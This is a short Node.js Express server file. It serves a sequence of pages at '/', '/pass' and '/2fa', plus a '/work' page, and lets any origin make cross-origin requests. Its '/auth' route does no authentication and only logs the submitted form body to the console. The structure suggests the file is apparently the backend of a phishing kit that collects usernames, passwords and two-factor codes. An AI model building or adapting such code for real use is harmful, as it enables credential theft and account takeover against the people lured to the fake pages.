// server.js
const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const port = 4000;

app.use(bodyParser.urlencoded({ extended: false }));
app.use(function(req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    next();
  });

// Set up home route
app.get('/', (req, res) => {
    res.sendFile(__dirname+"/temp/1.html");
}).listen(port);

app.get('/pass', (req, res) => {
    res.sendFile(__dirname+"/temp/2.html");
});
app.get('/2fa', (req, res) => {
    res.sendFile(__dirname+"/temp/3.html");
});
app.get('/work',(req, res) => {
    res.sendFile(__dirname+"/temp/work.html");
})
app.post('/auth',(req,res) => {
    console.log((req.body))
    res.sendStatus(200)
})